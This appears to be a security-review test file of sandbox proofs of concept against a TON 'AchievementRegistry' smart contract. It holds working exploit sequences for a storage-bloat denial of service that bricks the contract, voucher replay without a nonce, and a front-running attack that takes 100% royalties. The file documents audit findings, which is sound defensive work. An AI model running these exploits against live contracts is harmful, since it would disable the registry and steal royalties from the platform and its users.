// Security-review PoCs for contracts/achievement_registry.tact. Uses the
// existing build/ artifacts read-only; not part of the regular suite.
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, beginCell, Builder, Cell, toNano } from '@ton/core';
import { keyPairFromSeed, KeyPair } from '@ton/crypto';
import { AchievementRegistry, storeMintVoucher, storeRegisterVoucher } from '../../wrappers/AchievementRegistry';
import { AchievementItem } from '../../wrappers/AchievementItem';
import '@ton/test-utils';
import { globalIdOf, signatureCell, signVoucher, TAG } from '../helpers/vouchers';

const CHAT_ID = -1001234567890n;
const URL = 'https://achivator.cc/metadata/first-steps.json';
const OP_REGISTER = 0x014b6f2d;

async function cells(bc: Blockchain, a: Address): Promise<number> {
    const acc = (await bc.getContract(a)).account.account!;
    return Number(acc.storageStats.used.cells);
}

// `n` distinct small cells as a 4-ary tree (depth stays far below 512).
let uniq = 0;
function junkTree(n: number): Cell {
    const b = beginCell().storeUint(uniq++, 32);
    let left = n - 1;
    const kids: Cell[] = [];
    for (let i = 0; i < 4 && left > 0; i++) {
        const share = Math.ceil(left / (4 - i));
        kids.push(junkTree(share));
        left -= share;
    }
    for (const k of kids) b.storeRef(k);
    return b.endCell();
}

describe('AchievementRegistry PoC', () => {
    let blockchain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let admin: SandboxContract<TreasuryContract>;
    let attacker: SandboxContract<TreasuryContract>;
    let member: SandboxContract<TreasuryContract>;
    let backend: KeyPair;
    let registry: SandboxContract<AchievementRegistry>;
    let farFuture: bigint;

    async function deployRegistry(bc: Blockchain, ownerAddr: Address) {
        const collectionContent = beginCell()
            .storeUint(1, 8)
            .storeStringTail('https://achivator.cc/collection.json')
            .endCell();
        const r = bc.openContract(
            await AchievementRegistry.fromInit(
                ownerAddr,
                BigInt('0x' + backend.publicKey.toString('hex')),
                collectionContent,
            ),
        );
        return r;
    }

    function regVoucher(registrant: Address, target: Address, chatId = CHAT_ID) {
        const voucherCell = beginCell()
            .store(storeRegisterVoucher({ $$type: 'RegisterVoucher', chatId, registrant, expiry: farFuture }))
            .endCell();
        return {
            voucherCell,
            signature: signatureCell(signVoucher(voucherCell, backend, TAG.Register, target, globalIdOf(blockchain))),
        };
    }

    function mintMsg(target: Address, templateId: bigint, recipient: Address, tgUserId: bigint, nonce: bigint) {
        const voucherCell = beginCell()
            .store(
                storeMintVoucher({ $$type: 'MintVoucher', templateId, recipient, tgUserId, nonce, expiry: farFuture }),
            )
            .endCell();
        return {
            $$type: 'MintAchievement' as const,
            voucherCell,
            signature: signatureCell(signVoucher(voucherCell, backend, TAG.Mint, target, globalIdOf(blockchain))),
        };
    }

    // RegisterTemplate built by hand so contentUrl can be an arbitrary cell.
    function rawRegisterBody(
        contentUrl: Cell,
        v: { voucherCell: Cell; signature: Cell },
        royaltyTo: Address,
        num = 5n,
        den = 100n,
    ) {
        return beginCell()
            .storeUint(OP_REGISTER, 32)
            .storeRef(contentUrl)
            .storeUint(123n, 256)
            .storeUint(num, 16)
            .storeUint(den, 16)
            .storeAddress(royaltyTo)
            .storeRef(v.voucherCell)
            .storeRef(v.signature)
            .endCell();
    }

    beforeEach(async () => {
        blockchain = await Blockchain.create();
        farFuture = BigInt(Math.floor(Date.now() / 1000) + 3600);
        owner = await blockchain.treasury('owner');
        admin = await blockchain.treasury('admin');
        attacker = await blockchain.treasury('attacker', { balance: toNano('1000') });
        member = await blockchain.treasury('member');
        backend = keyPairFromSeed(Buffer.alloc(32, 7));
        registry = await deployRegistry(blockchain, owner.address);
        await registry.send(owner.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
    });

    it('AR-1/AR-2: snakeCells only follows ref[0]; one voucher bloats the registry past max_acc_state_cells and bricks it', async () => {
        const v = regVoucher(attacker.address, registry.address);
        const base = await cells(blockchain, registry.address);
        let attackerSpent = 0n;
        let lastOk = 0;
        for (let i = 0; i < 12; i++) {
            // root: URL bytes; ref0: 1-cell tail (snakeCells == 2, passes the cap);
            // refs 1..3: ~8100 distinct junk cells that the length check never sees
            const tail = beginCell().storeStringTail('x.json').endCell();
            const url = beginCell()
                .storeBuffer(Buffer.from('https://evil.example/'))
                .storeRef(tail)
                .storeRef(junkTree(2700))
                .storeRef(junkTree(2700))
                .storeRef(junkTree(2700))
                .endCell();
            const before = (await blockchain.getContract(attacker.address)).balance;
            const res = await attacker.send({
                to: registry.address,
                value: toNano('0.1'),
                body: rawRegisterBody(url, v, attacker.address),
            });
            const after = (await blockchain.getContract(attacker.address)).balance;
            const tx = res.transactions.find(
                (t) => t.inMessage?.info.dest?.toString() === registry.address.toString(),
            )!;
            const d: any = tx.description;
            const ok = d.computePhase.type === 'vm' && d.computePhase.success && d.actionPhase?.success;
            const c = await cells(blockchain, registry.address);
            console.log(
                `register #${i}: ok=${ok} action=${d.actionPhase?.resultCode} registryCells=${c} attackerCost=${Number(before - after) / 1e9} TON`,
            );
            if (ok) {
                lastOk = i;
                attackerSpent += before - after;
            } else break;
        }
        // top off greedily with smaller junk so the remaining room is < 4 cells
        async function tryReg(k: number) {
            const url =
                k > 0
                    ? beginCell()
                          .storeBuffer(Buffer.from('https://e.x/'))
                          .storeRef(beginCell().endCell())
                          .storeRef(junkTree(k))
                          .endCell()
                    : beginCell()
                          .storeBuffer(Buffer.from('https://e.x/' + uniq++))
                          .endCell();
            const before = (await blockchain.getContract(attacker.address)).balance;
            const res = await attacker.send({
                to: registry.address,
                value: toNano('0.1'),
                body: rawRegisterBody(url, v, attacker.address),
            });
            const d: any = res.transactions.find(
                (t) => t.inMessage?.info.dest?.toString() === registry.address.toString(),
            )!.description;
            attackerSpent += before - (await blockchain.getContract(attacker.address)).balance;
            return d.computePhase.success && d.actionPhase?.success;
        }
        for (const k of [4096, 2048, 1024, 512, 256, 128, 64, 32, 16, 8, 4, 2, 1, 0]) {
            while (await tryReg(k)) {}
        }
        const filled = await cells(blockchain, registry.address);
        console.log(
            `registry cells before attack=${base}, after top-off=${filled}; attacker total cost=${Number(attackerSpent) / 1e9} TON`,
        );
        expect(filled).toBeGreaterThan(65530);

        // the bloated template reads back fine in FunC but breaks the TS String decoder
        await expect(registry.getTemplate(0n)).rejects.toThrow(/invalid number of refs/);

        // AR-2: an honest registration fails (action phase 50: account state too big)
        const honest = await admin.send({
            to: registry.address,
            value: toNano('0.2'),
            body: rawRegisterBody(
                beginCell().storeStringTail(URL).endCell(),
                regVoucher(admin.address, registry.address),
                admin.address,
            ),
        });
        const htx: any = honest.transactions.find(
            (t) =>
                t.inMessage?.info.src?.toString() === admin.address.toString() &&
                t.inMessage?.info.dest?.toString() === registry.address.toString(),
        )!.description;
        console.log(
            'honest register: compute',
            htx.computePhase.success,
            'action',
            htx.actionPhase?.success,
            htx.actionPhase?.resultCode,
        );
        expect(htx.actionPhase?.success).toBe(false);

        // honest mints: at most one squeezes into the leftover room, then every mint fails forever
        let okMints = 0;
        let lastCode = 0;
        for (let i = 0; i < 5; i++) {
            const mint = await registry.send(
                member.getSender(),
                { value: toNano('0.2') },
                mintMsg(registry.address, 0n, member.address, 42n + BigInt(i), 1n + BigInt(i)),
            );
            const mtx: any = mint.transactions.find(
                (t) =>
                    t.inMessage?.info.src?.toString() === member.address.toString() &&
                    t.inMessage?.info.dest?.toString() === registry.address.toString(),
            )!.description;
            if (mtx.actionPhase?.success) okMints++;
            else lastCode = mtx.actionPhase?.resultCode;
        }
        console.log(
            `honest mints succeeded=${okMints}/5, failure action code=${lastCode}, cells=${await cells(blockchain, registry.address)}`,
        );
        expect(okMints).toBeLessThanOrEqual(1);
        expect(lastCode).toBe(50);
    }, 600_000);

    it('AR-2: measures state growth per template and per mint (legit traffic also reaches the 65536-cell cap)', async () => {
        const v = regVoucher(admin.address, registry.address);
        const c0 = await cells(blockchain, registry.address);
        await registry.send(
            admin.getSender(),
            { value: toNano('0.2') },
            {
                $$type: 'RegisterTemplate',
                contentUrl: 'https://achivator.cc/metadata/items/v1/' + 'a'.repeat(150) + '.json',
                contentHash: 1n,
                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
                ...v,
            },
        );
        const c1 = await cells(blockchain, registry.address);
        const N = 200;
        for (let i = 0; i < N; i++) {
            const r = await registry.send(
                member.getSender(),
                { value: toNano('0.15') },
                mintMsg(registry.address, 0n, member.address, 1000n + BigInt(i), 10_000n + BigInt(i) * 7919n),
            );
            expect(r.transactions).toHaveTransaction({ from: member.address, to: registry.address, success: true });
        }
        const c2 = await cells(blockchain, registry.address);
        const perMint = (c2 - c1) / N;
        console.log(
            `cells: base=${c0} +template=${c1 - c0} perMint=${perMint.toFixed(2)} => mints until 65536 ~ ${Math.floor((65536 - c2) / perMint)}`,
        );
        expect(perMint).toBeGreaterThan(1.5);
    }, 600_000);

    it('AR-3: a RegisterVoucher has no nonce: one voucher registers unlimited templates until expiry', async () => {
        const v = regVoucher(admin.address, registry.address);
        for (let i = 0; i < 5; i++) {
            const r = await registry.send(
                admin.getSender(),
                { value: toNano('0.1') },
                {
                    $$type: 'RegisterTemplate',
                    contentUrl: URL,
                    contentHash: 1n,
                    royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
                    ...v,
                },
            );
            expect(r.transactions).toHaveTransaction({ from: admin.address, to: registry.address, success: true });
        }
        expect(await registry.getTemplatesCount()).toEqual(5n);
    });

    // AR-4 (X-2) is fixed: vouchers name their network. The regression test
    // is tests/NetworkBinding.spec.ts.

    it('AR-5: templateId is assigned at execution; registerTemplates.ts maps the pre-read count, so a front-run hijacks the mapping (100% royalty accepted)', async () => {
        // registerTemplates.ts: templateId = getTemplatesCount() BEFORE sending
        const expectedId = await registry.getTemplatesCount();
        // attacker (any holder of a register voucher) lands first, 100% royalty to self
        await attacker.send({
            to: registry.address,
            value: toNano('0.1'),
            body: rawRegisterBody(
                beginCell().storeStringTail('https://evil.example/fake.json').endCell(),
                regVoucher(attacker.address, registry.address),
                attacker.address,
                100n,
                100n,
            ),
        });
        // platform registration
        await registry.send(
            admin.getSender(),
            { value: toNano('0.2') },
            {
                $$type: 'RegisterTemplate',
                contentUrl: URL,
                contentHash: 1n,
                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
                ...regVoucher(admin.address, registry.address, 0n),
            },
        );
        // script's wait loop: count != expectedId -> "confirmed", records type -> expectedId
        expect(await registry.getTemplatesCount()).not.toEqual(expectedId);
        const mapped = (await registry.getTemplate(expectedId))!;
        expect(mapped.creator.equals(attacker.address)).toBe(true);
        expect(mapped.royalty.numerator).toEqual(mapped.royalty.denominator);
        // backend now signs platform mints for the attacker's template
        await registry.send(
            member.getSender(),
            { value: toNano('0.2') },
            mintMsg(registry.address, expectedId, member.address, 7n, 1n),
        );
        const item = blockchain.openContract(AchievementItem.fromAddress(await registry.getNftAddress(0n)));
        const r = await item.getGetRoyaltyParams();
        expect(r.destination.equals(attacker.address)).toBe(true);
        expect(r.numerator).toEqual(100n);
    });

    it('AR-INFO: a leaked mint voucher can be submitted by anyone; the NFT still goes to the signed recipient', async () => {
        await registry.send(
            admin.getSender(),
            { value: toNano('0.2') },
            {
                $$type: 'RegisterTemplate',
                contentUrl: URL,
                contentHash: 1n,
                royalty: { $$type: 'RoyaltyParams', numerator: 5n, denominator: 100n, destination: admin.address },
                ...regVoucher(admin.address, registry.address),
            },
        );
        const m = mintMsg(registry.address, 0n, member.address, 9n, 1n);
        const fr = await registry.send(attacker.getSender(), { value: toNano('0.2') }, m);
        expect(fr.transactions).toHaveTransaction({ from: attacker.address, to: registry.address, success: true });
        const item = blockchain.openContract(AchievementItem.fromAddress(await registry.getNftAddress(0n)));
        expect((await item.getGetNftData()).owner_address.equals(member.address)).toBe(true);
        const own = await registry.send(member.getSender(), { value: toNano('0.2') }, m);
        expect(own.transactions).toHaveTransaction({ from: member.address, to: registry.address, success: false });
    });
});
